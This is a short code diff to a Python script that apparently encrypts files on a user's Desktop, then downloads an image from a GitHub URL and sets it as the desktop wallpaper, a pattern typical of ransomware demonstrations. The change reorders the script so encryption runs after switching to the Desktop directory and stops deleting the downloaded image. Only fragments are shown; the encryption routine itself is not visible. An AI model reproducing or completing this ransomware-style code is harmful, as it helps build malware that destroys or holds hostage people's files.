@@ -58,7 +58,6 @@ def encrypt():
     except FileNotFoundError:
         print("Error encrypting files. Desktop directory not found.")
 
-
             # print(encrypted)
                 
             # # add new extention   
@@ -87,11 +86,11 @@ if __name__ == "__main__":
     wallpaper_url = "https://raw.githubusercontent.com/tompilooo/EncryptFile/main/bt.jpg"
     download_path = os.path.abspath("bt.jpg")
 
-    #Encryption
-    encrypt()
-
     # Desktop directory
     change_to_desktop()
+
+    #Encryption
+    encrypt()
 
     # Download the file
     download_file(wallpaper_url, download_path)
@@ -100,4 +99,4 @@ if __name__ == "__main__":
     change_wallpaper(download_path)
 
     # Optionally, remove the downloaded file after changing the wallpaper
-    os.remove(download_path)
+    # os.remove(download_path)
